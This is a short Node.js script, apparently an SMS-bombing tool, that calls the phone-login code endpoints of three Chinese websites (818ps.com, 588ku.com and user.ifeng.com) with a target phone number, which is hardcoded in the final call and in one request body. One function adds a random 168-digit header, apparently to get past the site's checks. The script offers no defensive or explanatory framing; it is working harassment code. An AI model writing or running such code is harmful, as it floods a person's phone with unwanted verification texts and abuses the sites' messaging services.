const https = require('https')

// ####################
// 图怪兽
// ####################

async function pipe1(phone) {
	let para = ''
	for (let i = 0; i < 168; i++) {
		para += Math.floor(Math.random() * 10)
	}
	https.get(`https://818ps.com/site-api/send-tel-login-code?num=${phone}&codeImg=undefined`, {
		method: 'GET',
		headers: {
			para
		}
	})
}
// ####################
// 千库网
// ####################
const querystring = require('querystring')
async function pipe2(phone) {
	const req = https.request(`https://588ku.com/index.php?m=LoginPhoneNew&a=sendMessageLogin`, {
		method: 'POST',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
		}
	})
	req.write(querystring.stringify({ phone }))
	req.end()
}
// ####################
// 凤凰网
// ####################
async function pipe3(phone) {
	const req = https.request(`https://user.ifeng.com/api/v1/sendsms?platform=w&systemid=1`, {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json'
		}
	})
	req.write(JSON.stringify({"mobile":"17761204104","smsform":1}))
	req.end()
}

setTimeout(() => {
	// pipe1('17761204104')
	// pipe2('17761204104')
	pipe3('17761204104')
}, 1000);